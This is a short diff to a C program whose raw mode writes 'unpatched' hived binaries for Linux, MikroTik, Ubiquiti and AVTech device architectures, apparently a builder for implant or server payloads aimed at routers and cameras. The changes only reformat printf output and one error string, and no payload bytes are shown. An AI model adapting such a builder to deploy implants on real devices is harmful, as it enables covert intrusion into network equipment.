@@ -391,7 +391,7 @@ int main(int argc, char **argv)
 	}
 
 	if (raw == 1) {
-		printf("Creating raw unpatched binaries for all supported architectures...");
+		printf("\nCreating raw unpatched binaries for all supported architectures...\n\n");
 
 		remove(HIVE_LINUX_X86_UNPATCHED);
 		remove(HIVE_MIKROTIK_X86_UNPATCHED);
@@ -406,7 +406,7 @@ int main(int argc, char **argv)
 		non_patch(HIVE_MIKROTIK_PPC_UNPATCHED, hived_mikrotik_ppc_unpatched, hived_mikrotik_ppc_unpatched_len);
 		non_patch(HIVE_UBIQUITI_MIPS_UNPATCHED, hived_ubiquiti_mips_unpatched, hived_ubiquiti_mips_unpatched_len);
 		non_patch(HIVE_AVTECH_ARM_UNPATCHED, hived_avtech_arm_unpatched, hived_avtech_arm_unpatched_len);
-		printf("done.\n");
+		printf("done.\n\n");
 		return 0;
 	}
 
@@ -541,18 +541,18 @@ int non_patch(char *filename, unsigned char *hexarray, unsigned int arraylen)
 {
 	int fd, ret;
 
-	printf("  Generating %s file...", filename);
+	printf("\tGenerating %s file...", filename);
 
 	fd = creat(filename, CREAT_MODE);
 	if (fd < 0) {
-		perror("creat");
+		perror("create");
 		exit(-1);
 	}
 
 	ret = write(fd, hexarray, arraylen);
 
 	if ((unsigned int) ret != arraylen) {
-		printf("FAILED\n  Writing Server incomplete.  Aborting.\n\n");
+		printf("FAILED\n\tWriting Server incomplete. Aborting.\n\n");
 		exit(-1);
 	}
 
